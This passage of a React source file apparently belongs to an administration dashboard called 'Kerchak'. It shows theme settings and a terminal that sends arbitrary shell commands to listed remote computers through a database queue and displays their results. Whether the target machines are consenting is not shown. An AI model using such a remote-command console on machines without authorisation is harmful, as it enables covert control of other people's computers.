                   <div className="space-y-4">
                      <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest">Primary Identity Color</label>
                      <div className="flex gap-4">
                         {['#dc2626', '#2563eb', '#16a34a', '#9333ea', '#ca8a04', '#0891b2'].map(color => (
                            <button key={color} onClick={() => { setThemeColor(color); localStorage.setItem('kerchak_theme', color); }} className="w-12 h-12 rounded-2xl transition-all hover:scale-110 active:scale-95 border-2" style={{ backgroundColor: color, borderColor: themeColor === color ? 'white' : 'transparent' }}></button>
                         ))}
                      </div>
                   </div>
                   <div className="p-6 bg-white/5 rounded-2xl border border-white/5 flex items-center justify-between">
                      <span className="text-[10px] font-black text-gray-500 uppercase tracking-widest">Software Version</span>
                      <span className="text-xs font-black text-white">v3.0.0-PRO_BUILD</span>
                   </div>
                </div>
             </div>
          </div>
        )}
      </div>

      {/* Terminal View */}
      {showTerminal && (
        <div className="fixed inset-0 z-[200] bg-black/95 backdrop-blur-3xl flex items-center justify-center p-8">
           <div className="w-full max-w-6xl h-[80vh] bg-[#0c0c0c] border border-white/10 rounded-[3rem] overflow-hidden flex flex-col shadow-2xl">
              <div className="p-6 border-b border-white/5 flex justify-between items-center">
                 <div className="flex items-center gap-4 text-xs font-black uppercase tracking-widest text-red-500">
                    <Terminal size={20} /> Remote Shell Connection: {activePC}
                 </div>
                 <button onClick={() => setShowTerminal(false)} className="p-3 bg-white/5 hover:bg-white/10 rounded-xl text-gray-500"><X size={20} /></button>
              </div>
              <div className="flex-1 p-10 overflow-y-auto custom-scrollbar font-mono text-sm space-y-2">
                 {terminalOutput.map((l, i) => <div key={i} className="text-gray-400 break-all">{l}</div>)}
                 <div className="flex gap-3 text-red-500 font-black">
                    <span>ADMIN@KERCHAK:&gt;</span>
                    <input autoFocus className="bg-transparent border-none outline-none flex-1 text-white" value={terminalInput} onChange={e=>setTerminalInput(e.target.value)} onKeyDown={async e => {
                      if(e.key === 'Enter' && terminalInput) {
                        const cmd = terminalInput;
                        setTerminalOutput(prev => [...prev, `ADMIN@KERCHAK:> ${cmd}`]);
                        setTerminalInput("");
                        const pc = computers.find(c => c.pc_name === activePC);
                        if(pc) {
                          const { data } = await supabase.from('commands').insert({ computer_id: pc.id, command: 'cmd', args: cmd, status: 'pending' }).select().single();
                          if(data) {
                            const interval = setInterval(async () => {
                              const { data: r } = await supabase.from('commands').select('result, status').eq('id', data.id).single();
                              if(r?.status === 'executed' && r.result) { setTerminalOutput(p => [...p, r.result, ""]); clearInterval(interval); }
                            }, 1000);
                            setTimeout(()=>clearInterval(interval), 30000);
                          }
                        }
                      }
                    }} />
                 </div>
                 <div ref={terminalEndRef} />
              </div>
           </div>
        </div>
      )}
    </div>
  );
}
